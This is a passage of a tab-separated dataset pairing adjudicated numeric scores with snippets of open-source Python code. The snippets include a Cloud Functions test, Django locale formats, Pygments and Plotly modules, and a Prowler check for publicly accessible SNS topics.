base64.b64encode(name.encode('utf-8')).decode('utf-8')<<NEWL>>    pubsub_message = {<<NEWL>>        'data': {'data': encoded_name}<<NEWL>>    }<<NEWL>><<NEWL>>    process = subprocess.Popen(<<NEWL>>      [<<NEWL>>        'functions-framework',<<NEWL>>        '--target', 'hello_pubsub',<<NEWL>>        '--signature-type', 'event',<<NEWL>>        '--port', str(port)<<NEWL>>      ],<<NEWL>>      cwd=os.path.dirname(__file__),<<NEWL>>      stdout=subprocess.PIPE<<NEWL>>    )<<NEWL>><<NEWL>>    # Send HTTP request simulating Pub/Sub message<<NEWL>>    # (GCF translates Pub/Sub messages to HTTP requests internally)<<NEWL>>    url = f'http://localhost:{port}/'<<NEWL>><<NEWL>>    retry_policy = Retry(total=6, backoff_factor=1)<<NEWL>>    retry_adapter = requests.adapters.HTTPAdapter(<<NEWL>>      max_retries=retry_policy)<<NEWL>><<NEWL>>    session = requests.Session()<<NEWL>>    session.mount(url, retry_adapter)<<NEWL>><<NEWL>>    response = session.post(url, json=pubsub_message)<<NEWL>><<NEWL>>    assert response.status_code == 200<<NEWL>><<NEWL>>    # Stop the functions framework process<<NEWL>>    process.kill()<<NEWL>>    process.wait()<<NEWL>>    out, err = process.communicate()<<NEWL>><<NEWL>>    print(out, err, response.content)<<NEWL>><<NEWL>>    assert f'Hello {name}!' in str(out)<<NEWL>># [END functions_pubsub_integration_test]
200	adjudicated	4	"# This file is distributed under the same license as the Django package.<<NEWL>>#<<NEWL>># The *_FORMAT strings use the Django date format syntax,<<NEWL>># see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date<<NEWL>>DATE_FORMAT = 'l, j F, Y'<<NEWL>>TIME_FORMAT = 'h:i a'<<NEWL>>DATETIME_FORMAT = 'j F, Y h:i a'<<NEWL>>YEAR_MONTH_FORMAT = 'F, Y'<<NEWL>>MONTH_DAY_FORMAT = 'j F'<<NEWL>>SHORT_DATE_FORMAT = 'j.M.Y'<<NEWL>>SHORT_DATETIME_FORMAT = 'j.M.Y H:i'<<NEWL>>FIRST_DAY_OF_WEEK = 1  # (Monday)<<NEWL>><<NEWL>># The *_INPUT_FORMATS strings use the Python strftime format syntax,<<NEWL>># see https://docs.python.org/library/datetime.html#strftime-strptime-behavior<<NEWL>># Kept ISO formats as they are in first position<<NEWL>>DATE_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d', '%m/%d/%Y', '%m/%d/%y',     # '2006-10-25', '10/25/2006', '10/25/06'<<NEWL>>    '%d.%m.%Y', '%d.%m.%y',                 # '25.10.2006', '25.10.06'<<NEWL>>    # '%d %b %Y', '%d %b, %Y', '%d %b. %Y',   # '25 Oct 2006', '25 Oct, 2006', '25 Oct. 2006'<<NEWL>>    # '%d %B %Y', '%d %B, %Y',                # '25 October 2006', '25 October, 2006'<<NEWL>>]<<NEWL>>DATETIME_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'<<NEWL>>    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'<<NEWL>>    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'<<NEWL>>    '%d.%m.%Y %H:%M:%S',     # '25.10.2006 14:30:59'<<NEWL>>    '%d.%m.%Y %H:%M:%S.%f',  # '25.10.2006 14:30:59.000200'<<NEWL>>    '%d.%m.%Y %H:%M',        # '25.10.2006 14:30'<<NEWL>>    '%d.%m.%y %H:%M:%S',     # '25.10.06 14:30:59'<<NEWL>>    '%d.%m.%y %H:%M:%S.%f',  # '25.10.06 14:30:59.000200'<<NEWL>>    '%d.%m.%y %H:%M',        # '25.10.06 14:30'<<NEWL>>    '%m/%d/%Y %H:%M:%S',     # '10/25/2006 14:30:59'<<NEWL>>    '%m/%d/%Y %H:%M:%S.%f',  # '10/25/2006 14:30:59.000200'<<NEWL>>    '%m/%d/%Y %H:%M',        # '10/25/2006 14:30'<<NEWL>>    '%m/%d/%y %H:%M:%S',     # '10/25/06 14:30:59'<<NEWL>>    '%m/%d/%y %H:%M:%S.%f',  # '10/25/06 14:30:59.000200'<<NEWL>>    '%m/%d/%y %H:%M',        # '10/25/06 14:30'<<NEWL>>]<<NEWL>>DECIMAL_SEPARATOR = '.'<<NEWL>>THOUSAND_SEPARATOR = "" ""<<NEWL>>NUMBER_GROUPING = 3"
191	adjudicated	0	"#! /usr/bin/env python3<<NEWL>><<NEWL>>import os<<NEWL>><<NEWL>>try:<<NEWL>>    from setuptools import find_packages, setup<<NEWL>>except AttributeError:<<NEWL>>    from setuptools import find_packages, setup<<NEWL>><<NEWL>>NAME = 'wofrysrw'<<NEWL>>VERSION = '1.1.24'<<NEWL>>ISRELEASED = True<<NEWL>><<NEWL>>DESCRIPTION = 'WOFRY for SRW library'<<NEWL>>README_FILE = os.path.join(os.path.dirname(__file__), 'README.md')<<NEWL>>LONG_DESCRIPTION = open(README_FILE).read()<<NEWL>>AUTHOR = 'Luca Rebuffi'<<NEWL>>AUTHOR_EMAIL = 'lrebuffi@anl.gov'<<NEWL>>URL = 'https://github.com/lucarebuffi/wofrysrw'<<NEWL>>DOWNLOAD_URL = 'https://github.com/lucarebuffi/wofrysrw'<<NEWL>>LICENSE = 'GPLv3'<<NEWL>><<NEWL>>KEYWORDS = (<<NEWL>>    'dictionary',<<NEWL>>    'glossary',<<NEWL>>    'synchrotron'<<NEWL>>    'simulation',<<NEWL>>)<<NEWL>><<NEWL>>CLASSIFIERS = (<<NEWL>>    'Development Status :: 4 - Beta',<<NEWL>>    'Environment :: X11 Applications :: Qt',<<NEWL>>    'Environment :: Console',<<NEWL>>    'Environment :: Plugins',<<NEWL>>    'Programming Language :: Python :: 3',<<NEWL>>    'Intended Audience :: Science/Research',<<NEWL>>)<<NEWL>><<NEWL>>SETUP_REQUIRES = (<<NEWL>>    'setuptools',<<NEWL>>)<<NEWL>><<NEWL>>INSTALL_REQUIRES = (<<NEWL>>    'setuptools',<<NEWL>>    'numpy',<<NEWL>>    'scipy',<<NEWL>>    'syned>=1.0.26',<<NEWL>>    'wofry>=1.0.31',<<NEWL>>    'oasys-srwpy>=1.0.5'<<NEWL>>)<<NEWL>><<NEWL>>PACKAGES = [<<NEWL>>    ""wofrysrw"",<<NEWL>>]<<NEWL>><<NEWL>>PACKAGE_DATA = {}<<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    try:<<NEWL>>        import PyMca5, PyQt4<<NEWL>><<NEWL>>        raise NotImplementedError(""This version of wofrysrw doesn't work with Oasys1 beta.\nPlease install OASYS1 final release: https://www.aps.anl.gov/Science/Scientific-Software/OASYS"")<<NEWL>>    except:<<NEWL>>        setup(<<NEWL>>              name = NAME,<<NEWL>>              version = VERSION,<<NEWL>>              description = DESCRIPTION,<<NEWL>>              long_description = LONG_DESCRIPTION,<<NEWL>>              author = AUTHOR,<<NEWL>>              author_email = AUTHOR_EMAIL,<<NEWL>>              url = URL,<<NEWL>>              download_url = DOWNLOAD_URL,<<NEWL>>              license = LICENSE,<<NEWL>>              keywords = KEYWORDS,<<NEWL>>              classifiers = CLASSIFIERS,<<NEWL>>              packages = PACKAGES,<<NEWL>>              package_data = PACKAGE_DATA,<<NEWL>>              setup_requires = SETUP_REQUIRES,<<NEWL>>              install_requires = INSTALL_REQUIRES,<<NEWL>>              include_package_data = True,<<NEWL>>              zip_safe = False,<<NEWL>>              )"
311	adjudicated	0	"#!/usr/bin/env python<<NEWL>>#<<NEWL>># Copyright 2017 the original author or authors.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>#<<NEWL>><<NEWL>>from lxml import etree<<NEWL>>import structlog<<NEWL>>from netconf.nc_rpc.rpc import Rpc<<NEWL>>import netconf.nc_common.error as ncerror<<NEWL>><<NEWL>>log = structlog.get_logger()<<NEWL>><<NEWL>><<NEWL>>class CloseSession(Rpc):<<NEWL>>    def __init__(self, request, request_xml, grpc_client, session,<<NEWL>>                 capabilities):<<NEWL>>        super(CloseSession, self).__init__(request, request_xml, grpc_client,<<NEWL>>                                           session, capabilities)<<NEWL>>        self._validate_parameters()<<NEWL>><<NEWL>>    def execute(self):<<NEWL>>        log.info('close-session-request', session=self.session.session_id)<<NEWL>>        if self.rpc_response.is_error:<<NEWL>>            return self.rpc_response<<NEWL>><<NEWL>>        self.rpc_response.node = etree.Element(""ok"")<<NEWL>><<NEWL>>        # Set the close session flag<<NEWL>>        self.rpc_response.close_session = True<<NEWL>>        return self.rpc_response<<NEWL>><<NEWL>>    def _validate_parameters(self):<<NEWL>><<NEWL>>        if self.request:<<NEWL>>            try:<<NEWL>>                if self.request['command'] != 'close-session':<<NEWL>>                    self.rpc_response.is_error = True<<NEWL>>                    self.rpc_response.node = ncerror.BadMsg(self.request_xml)<<NEWL>>                    return<<NEWL>><<NEWL>>            except Exception as e:<<NEWL>>                self.rpc_response.is_error = True<<NEWL>>                self.rpc_response.node = ncerror.ServerException(<<NEWL>>                    self.request_xml)<<NEWL>>                return"
80	adjudicated	4	"from rx import Observable, AnonymousObservable<<NEWL>>from rx.internal.exceptions import SequenceContainsNoElementsError<<NEWL>>from rx.internal import extensionmethod<<NEWL>><<NEWL>>def single_or_default_async(source, has_default=False, default_value=None):<<NEWL>>    def subscribe(observer):<<NEWL>>        value = [default_value]<<NEWL>>        seen_value = [False]<<NEWL>><<NEWL>>        def on_next(x):<<NEWL>>            if seen_value[0]:<<NEWL>>                observer.on_error(Exception('Sequence contains more than one element'))<<NEWL>>            else:<<NEWL>>                value[0] = x<<NEWL>>                seen_value[0] = True<<NEWL>><<NEWL>>        def on_completed():<<NEWL>>            if not seen_value[0] and not has_default:<<NEWL>>                observer.on_error(SequenceContainsNoElementsError())<<NEWL>>            else:<<NEWL>>                observer.on_next(value[0])<<NEWL>>                observer.on_completed()<<NEWL>><<NEWL>>        return source.subscribe(on_next, observer.on_error, on_completed)<<NEWL>>    return AnonymousObservable(subscribe)<<NEWL>><<NEWL>><<NEWL>>@extensionmethod(Observable)<<NEWL>>def single_or_default(self, predicate, default_value):<<NEWL>>    """"""Returns the only element of an observable sequence that matches the<<NEWL>>    predicate, or a default value if no such element exists this method<<NEWL>>    reports an exception if there is more than one element in the observable<<NEWL>>    sequence.<<NEWL>><<NEWL>>    Example:<<NEWL>>    res = source.single_or_default()<<NEWL>>    res = source.single_or_default(lambda x: x == 42)<<NEWL>>    res = source.single_or_default(lambda x: x == 42, 0)<<NEWL>>    res = source.single_or_default(None, 0)<<NEWL>><<NEWL>>    Keyword arguments:<<NEWL>>    predicate -- {Function} A predicate function to evaluate for elements in<<NEWL>>        the source sequence.<<NEWL>>    default_value -- [Optional] The default value if the index is outside<<NEWL>>        the bounds of the source sequence.<<NEWL>><<NEWL>>    Returns {Observable} Sequence containing the single element in the<<NEWL>>    observable sequence that satisfies the condition in the predicate, or a<<NEWL>>    default value if no such element exists.<<NEWL>>    """"""<<NEWL>><<NEWL>>    return self.filter(predicate).single_or_default(None, default_value) if predicate else single_or_default_async(self, True, default_value)<<NEWL>>    "
251	adjudicated	4	"""""""<<NEWL>>Provide urlresolver functions that return fully qualified URLs or view names<<NEWL>>""""""<<NEWL>>from django.urls import NoReverseMatch<<NEWL>>from django.urls import reverse as django_reverse<<NEWL>>from django.utils.functional import lazy<<NEWL>><<NEWL>>from rest_framework.settings import api_settings<<NEWL>>from rest_framework.utils.urls import replace_query_param<<NEWL>><<NEWL>><<NEWL>>def preserve_builtin_query_params(url, request=None):<<NEWL>>    """"""<<NEWL>>    Given an incoming request, and an outgoing URL representation,<<NEWL>>    append the value of any built-in query parameters.<<NEWL>>    """"""<<NEWL>>    if request is None:<<NEWL>>        return url<<NEWL>><<NEWL>>    overrides = [<<NEWL>>        api_settings.URL_FORMAT_OVERRIDE,<<NEWL>>    ]<<NEWL>><<NEWL>>    for param in overrides:<<NEWL>>        if param and (param in request.GET):<<NEWL>>            value = request.GET[param]<<NEWL>>            url = replace_query_param(url, param, value)<<NEWL>><<NEWL>>    return url<<NEWL>><<NEWL>><<NEWL>>def reverse(viewname, args=None, kwargs=None, request=None, format=None, **extra):<<NEWL>>    """"""<<NEWL>>    If versioning is being used then we pass any `reverse` calls through<<NEWL>>    to the versioning scheme instance, so that the resulting URL<<NEWL>>    can be modified if needed.<<NEWL>>    """"""<<NEWL>>    scheme = getattr(request, 'versioning_scheme', None)<<NEWL>>    if scheme is not None:<<NEWL>>        try:<<NEWL>>            url = scheme.reverse(viewname, args, kwargs, request, format, **extra)<<NEWL>>        except NoReverseMatch:<<NEWL>>            # In case the versioning scheme reversal fails, fallback to the<<NEWL>>            # default implementation<<NEWL>>            url = _reverse(viewname, args, kwargs, request, format, **extra)<<NEWL>>    else:<<NEWL>>        url = _reverse(viewname, args, kwargs, request, format, **extra)<<NEWL>><<NEWL>>    return preserve_builtin_query_params(url, request)<<NEWL>><<NEWL>><<NEWL>>def _reverse(viewname, args=None, kwargs=None, request=None, format=None, **extra):<<NEWL>>    """"""<<NEWL>>    Same as `django.urls.reverse`, but optionally takes a request<<NEWL>>    and returns a fully qualified URL, using the request to get the base URL.<<NEWL>>    """"""<<NEWL>>    if format is not None:<<NEWL>>        kwargs = kwargs or {}<<NEWL>>        kwargs['format'] = format<<NEWL>>    url = django_reverse(viewname, args=args, kwargs=kwargs, **extra)<<NEWL>>    if request:<<NEWL>>        return request.build_absolute_uri(url)<<NEWL>>    return url<<NEWL>><<NEWL>><<NEWL>>reverse_lazy = lazy(reverse, str)"
331	adjudicated	3	"""""""<<NEWL>>    pygments.styles.native<<NEWL>>    ~~~~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    pygments version of my ""native"" vim theme.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.style import Style<<NEWL>>from pygments.token import Keyword, Name, Comment, String, Error, \<<NEWL>>     Number, Operator, Generic, Token, Whitespace<<NEWL>><<NEWL>><<NEWL>>class NativeStyle(Style):<<NEWL>>    """"""<<NEWL>>    Pygments version of the ""native"" vim theme.<<NEWL>>    """"""<<NEWL>><<NEWL>>    background_color = '#202020'<<NEWL>>    highlight_color = '#404040'<<NEWL>>    line_number_color = '#aaaaaa'<<NEWL>><<NEWL>>    styles = {<<NEWL>>        Token:              '#d0d0d0',<<NEWL>>        Whitespace:         '#666666',<<NEWL>><<NEWL>>        Comment:            'italic #ababab',<<NEWL>>        Comment.Preproc:    'noitalic bold #cd2828',<<NEWL>>        Comment.Special:    'noitalic bold #e50808 bg:#520000',<<NEWL>><<NEWL>>        Keyword:            'bold #6ebf26',<<NEWL>>        Keyword.Pseudo:     'nobold',<<NEWL>>        Operator.Word:      'bold #6ebf26',<<NEWL>><<NEWL>>        String:             '#ed9d13',<<NEWL>>        String.Other:       '#ffa500',<<NEWL>><<NEWL>>        Number:             '#51b2fd',<<NEWL>><<NEWL>>        Name.Builtin:       '#2fbccd',<<NEWL>>        Name.Variable:      '#40ffff',<<NEWL>>        Name.Constant:      '#40ffff',<<NEWL>>        Name.Class:         'underline #71adff',<<NEWL>>        Name.Function:      '#71adff',<<NEWL>>        Name.Namespace:     'underline #71adff',<<NEWL>>        Name.Exception:     '#bbbbbb',<<NEWL>>        Name.Tag:           'bold #6ebf26',<<NEWL>>        Name.Attribute:     '#bbbbbb',<<NEWL>>        Name.Decorator:     '#ffa500',<<NEWL>><<NEWL>>        Generic.Heading:    'bold #ffffff',<<NEWL>>        Generic.Subheading: 'underline #ffffff',<<NEWL>>        Generic.Deleted:    '#d22323',<<NEWL>>        Generic.Inserted:   '#589819',<<NEWL>>        Generic.Error:      '#d22323',<<NEWL>>        Generic.Emph:       'italic',<<NEWL>>        Generic.Strong:     'bold',<<NEWL>>        Generic.Prompt:     '#aaaaaa',<<NEWL>>        Generic.Output:     '#cccccc',<<NEWL>>        Generic.Traceback:  '#d22323',<<NEWL>><<NEWL>>        Error:              'bg:#e3d2d2 #a61717'<<NEWL>>    }"
271	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""insidetextfont"", parent_name=""funnelarea"", **kwargs<<NEWL>>    ):<<NEWL>>        super(InsidetextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
360	adjudicated	2	"""""""Manager to read and modify frontend config data in JSON files.<<NEWL>>""""""<<NEWL>># Copyright (c) Jupyter Development Team.<<NEWL>># Distributed under the terms of the Modified BSD License.<<NEWL>><<NEWL>>import os.path<<NEWL>><<NEWL>>from notebook.config_manager import BaseJSONConfigManager, recursive_update<<NEWL>>from jupyter_core.paths import jupyter_config_dir, jupyter_config_path<<NEWL>>from traitlets import Unicode, Instance, List, observe, default<<NEWL>>from traitlets.config import LoggingConfigurable<<NEWL>><<NEWL>><<NEWL>>class ConfigManager(LoggingConfigurable):<<NEWL>>    """"""Config Manager used for storing notebook frontend config""""""<<NEWL>><<NEWL>>    # Public API<<NEWL>><<NEWL>>    def get(self, section_name):<<NEWL>>        """"""Get the config from all config sections.""""""<<NEWL>>        config = {}<<NEWL>>        # step through back to front, to ensure front of the list is top priority<<NEWL>>        for p in self.read_config_path[::-1]:<<NEWL>>            cm = BaseJSONConfigManager(config_dir=p)<<NEWL>>            recursive_update(config, cm.get(section_name))<<NEWL>>        return config<<NEWL>><<NEWL>>    def set(self, section_name, data):<<NEWL>>        """"""Set the config only to the user's config.""""""<<NEWL>>        return self.write_config_manager.set(section_name, data)<<NEWL>><<NEWL>>    def update(self, section_name, new_data):<<NEWL>>        """"""Update the config only to the user's config.""""""<<NEWL>>        return self.write_config_manager.update(section_name, new_data)<<NEWL>><<NEWL>>    # Private API<<NEWL>><<NEWL>>    read_config_path = List(Unicode())<<NEWL>><<NEWL>>    @default('read_config_path')<<NEWL>>    def _default_read_config_path(self):<<NEWL>>        return [os.path.join(p, 'nbconfig') for p in jupyter_config_path()]<<NEWL>><<NEWL>>    write_config_dir = Unicode()<<NEWL>><<NEWL>>    @default('write_config_dir')<<NEWL>>    def _default_write_config_dir(self):<<NEWL>>        return os.path.join(jupyter_config_dir(), 'nbconfig')<<NEWL>><<NEWL>>    write_config_manager = Instance(BaseJSONConfigManager)<<NEWL>><<NEWL>>    @default('write_config_manager')<<NEWL>>    def _default_write_config_manager(self):<<NEWL>>        return BaseJSONConfigManager(config_dir=self.write_config_dir)<<NEWL>><<NEWL>>    @observe('write_config_dir')<<NEWL>>    def _update_write_config_dir(self, change):<<NEWL>>        self.write_config_manager = BaseJSONConfigManager(config_dir=self.write_config_dir)"
220	adjudicated	1	"# Copyright (c) 2006, 2010, 2012-2014 LOGILAB S.A. (Paris, FRANCE) <contact@logilab.fr><<NEWL>># Copyright (c) 2012-2014 Google, Inc.<<NEWL>># Copyright (c) 2012 FELD Boris <lothiraldan@gmail.com><<NEWL>># Copyright (c) 2014-2020 Claudiu Popa <pcmanticore@gmail.com><<NEWL>># Copyright (c) 2014 Brett Cannon <brett@python.org><<NEWL>># Copyright (c) 2014 Ricardo Gemignani <ricardo.gemignani@gmail.com><<NEWL>># Copyright (c) 2014 Arun Persaud <arun@nubati.net><<NEWL>># Copyright (c) 2015 Simu Toni <simutoni@gmail.com><<NEWL>># Copyright (c) 2015 Ionel Cristian Maries <contact@ionelmc.ro><<NEWL>># Copyright (c) 2017 KÃ¡ri Tristan Helgason <kthelgason@gmail.com><<NEWL>># Copyright (c) 2018 ssolanki <sushobhitsolanki@gmail.com><<NEWL>># Copyright (c) 2018 Sushobhit <31987769+sushobhit27@users.noreply.github.com><<NEWL>># Copyright (c) 2018 Ville SkyttÃ¤ <ville.skytta@iki.fi><<NEWL>># Copyright (c) 2019, 2021 Pierre Sassoulas <pierre.sassoulas@gmail.com><<NEWL>># Copyright (c) 2020 hippo91 <guillaume.peillex@gmail.com><<NEWL>># Copyright (c) 2020 Anthony Sottile <asottile@umich.edu><<NEWL>># Copyright (c) 2021 Marc Mueller <30130371+cdce8p@users.noreply.github.com><<NEWL>># Copyright (c) 2021 ruro <ruro.ruro@ya.ru><<NEWL>><<NEWL>># Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html<<NEWL>># For details: https://github.com/PyCQA/pylint/blob/main/LICENSE<<NEWL>><<NEWL>>""""""utilities methods and classes for reporters""""""<<NEWL>><<NEWL>><<NEWL>>from pylint import utils<<NEWL>>from pylint.reporters.base_reporter import BaseReporter<<NEWL>>from pylint.reporters.collecting_reporter import CollectingReporter<<NEWL>>from pylint.reporters.json_reporter import JSONReporter<<NEWL>>from pylint.reporters.multi_reporter import MultiReporter<<NEWL>>from pylint.reporters.reports_handler_mix_in import ReportsHandlerMixIn<<NEWL>><<NEWL>><<NEWL>>def initialize(linter):<<NEWL>>    """"""initialize linter with reporters in this package""""""<<NEWL>>    utils.register_plugins(linter, __path__[0])<<NEWL>><<NEWL>><<NEWL>>__all__ = [<<NEWL>>    ""BaseReporter"",<<NEWL>>    ""ReportsHandlerMixIn"",<<NEWL>>    ""JSONReporter"",<<NEWL>>    ""CollectingReporter"",<<NEWL>>    ""MultiReporter"",<<NEWL>>]"
393	adjudicated	3	"# Copyright 2017-present Open Networking Foundation<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>># http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>># Copyright (c) 2008 The Board of Trustees of The Leland Stanford Junior University<<NEWL>># Copyright (c) 2011, 2012 Open Networking Foundation<<NEWL>># Copyright (c) 2012, 2013 Big Switch Networks, Inc.<<NEWL>># See the file LICENSE.pyloxi which should have been included in the source distribution<<NEWL>># Automatically generated by LOXI from template toplevel_init.py<<NEWL>># Do not modify<<NEWL>><<NEWL>>version_names = {<<NEWL>>    1: ""1.0"",<<NEWL>>    2: ""1.1"",<<NEWL>>    3: ""1.2"",<<NEWL>>    4: ""1.3"",<<NEWL>>    5: ""1.4"",<<NEWL>>}<<NEWL>><<NEWL>>def protocol(ver):<<NEWL>>    """"""<<NEWL>>    Import and return the protocol module for the given wire version.<<NEWL>>    """"""<<NEWL>>    if ver == 1:<<NEWL>>        import of10<<NEWL>>        return of10<<NEWL>><<NEWL>>    if ver == 2:<<NEWL>>        import of11<<NEWL>>        return of11<<NEWL>><<NEWL>>    if ver == 3:<<NEWL>>        import of12<<NEWL>>        return of12<<NEWL>><<NEWL>>    if ver == 4:<<NEWL>>        import of13<<NEWL>>        return of13<<NEWL>><<NEWL>>    if ver == 5:<<NEWL>>        import of14<<NEWL>>        return of14<<NEWL>><<NEWL>>    raise ValueError<<NEWL>><<NEWL>>class ProtocolError(Exception):<<NEWL>>    """"""<<NEWL>>    Raised when failing to deserialize an invalid OpenFlow message.<<NEWL>>    """"""<<NEWL>>    pass<<NEWL>><<NEWL>>class Unimplemented(Exception):<<NEWL>>    """"""<<NEWL>>    Raised when an OpenFlow feature is not yet implemented in PyLoxi.<<NEWL>>    """"""<<NEWL>>    pass<<NEWL>><<NEWL>>def unimplemented(msg):<<NEWL>>    raise Unimplemented(msg)<<NEWL>><<NEWL>>class OFObject(object):<<NEWL>>    """"""<<NEWL>>    Superclass of all OpenFlow classes<<NEWL>>    """"""<<NEWL>>    def __init__(self, *args):<<NEWL>>        raise NotImplementedError(""cannot instantiate abstract class"")<<NEWL>><<NEWL>>    def __ne__(self, other):<<NEWL>>        return not self.__eq__(other)<<NEWL>><<NEWL>>    def show(self):<<NEWL>>        import loxi.pp<<NEWL>>        return loxi.pp.pp(self)"
2	adjudicated	4	# This file is distributed under the same license as the Django package.<<NEWL>>#<<NEWL>># The *_FORMAT strings use the Django date format syntax,<<NEWL>># see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date<<NEWL>>DATE_FORMAT = 'j M Y'                   # '25 Oct 2006'<<NEWL>>TIME_FORMAT = 'P'                       # '2:30 p.m.'<<NEWL>>DATETIME_FORMAT = 'j M Y, P'            # '25 Oct 2006, 2:30 p.m.'<<NEWL>>YEAR_MONTH_FORMAT = 'F Y'               # 'October 2006'<<NEWL>>MONTH_DAY_FORMAT = 'j F'                # '25 October'<<NEWL>>SHORT_DATE_FORMAT = 'd/m/Y'             # '25/10/2006'<<NEWL>>SHORT_DATETIME_FORMAT = 'd/m/Y P'       # '25/10/2006 2:30 p.m.'<<NEWL>>FIRST_DAY_OF_WEEK = 0                   # Sunday<<NEWL>><<NEWL>># The *_INPUT_FORMATS strings use the Python strftime format syntax,<<NEWL>># see https://docs.python.org/library/datetime.html#strftime-strptime-behavior<<NEWL>>DATE_INPUT_FORMATS = [<<NEWL>>    '%d/%m/%Y', '%d/%m/%y',             # '25/10/2006', '25/10/06'<<NEWL>>    # '%b %d %Y', '%b %d, %Y',          # 'Oct 25 2006', 'Oct 25, 2006'<<NEWL>>    # '%d %b %Y', '%d %b, %Y',          # '25 Oct 2006', '25 Oct, 2006'<<NEWL>>    # '%B %d %Y', '%B %d, %Y',          # 'October 25 2006', 'October 25, 2006'<<NEWL>>    # '%d %B %Y', '%d %B, %Y',          # '25 October 2006', '25 October, 2006'<<NEWL>>]<<NEWL>>DATETIME_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d %H:%M:%S',                # '2006-10-25 14:30:59'<<NEWL>>    '%Y-%m-%d %H:%M:%S.%f',             # '2006-10-25 14:30:59.000200'<<NEWL>>    '%Y-%m-%d %H:%M',                   # '2006-10-25 14:30'<<NEWL>>    '%d/%m/%Y %H:%M:%S',                # '25/10/2006 14:30:59'<<NEWL>>    '%d/%m/%Y %H:%M:%S.%f',             # '25/10/2006 14:30:59.000200'<<NEWL>>    '%d/%m/%Y %H:%M',                   # '25/10/2006 14:30'<<NEWL>>    '%d/%m/%y %H:%M:%S',                # '25/10/06 14:30:59'<<NEWL>>    '%d/%m/%y %H:%M:%S.%f',             # '25/10/06 14:30:59.000200'<<NEWL>>    '%d/%m/%y %H:%M',                   # '25/10/06 14:30'<<NEWL>>]<<NEWL>>DECIMAL_SEPARATOR = '.'<<NEWL>>THOUSAND_SEPARATOR = ','<<NEWL>>NUMBER_GROUPING = 3
142	adjudicated	0	"from prowler.lib.check.models import Check, Check_Report_AWS<<NEWL>>from prowler.providers.aws.services.sns.sns_client import sns_client<<NEWL>><<NEWL>><<NEWL>>class sns_topics_not_publicly_accessible(Check):<<NEWL>>    def execute(self):<<NEWL>>        findings = []<<NEWL>>        for topic in sns_client.topics:<<NEWL>>            report = Check_Report_AWS(self.metadata())<<NEWL>>            report.region = topic.region<<NEWL>>            report.resource_id = topic.name<<NEWL>>            report.resource_arn = topic.arn<<NEWL>>            report.status = ""PASS""<<NEWL>>            report.status_extended = f""SNS topic {topic.name} without public access""<<NEWL>>            if topic.policy:<<NEWL>>                for statement in topic.policy[""Statement""]:<<NEWL>>                    # Only check allow statements<<NEWL>>                    if statement[""Effect""] == ""Allow"":<<NEWL>>                        if (<<NEWL>>                            ""*"" in statement[""Principal""]<<NEWL>>                            or (<<NEWL>>                                ""AWS"" in statement[""Principal""]<<NEWL>>                                and ""*"" in statement[""Principal""][""AWS""]<<NEWL>>                            )<<NEWL>>                            or (<<NEWL>>                                ""CanonicalUser"" in 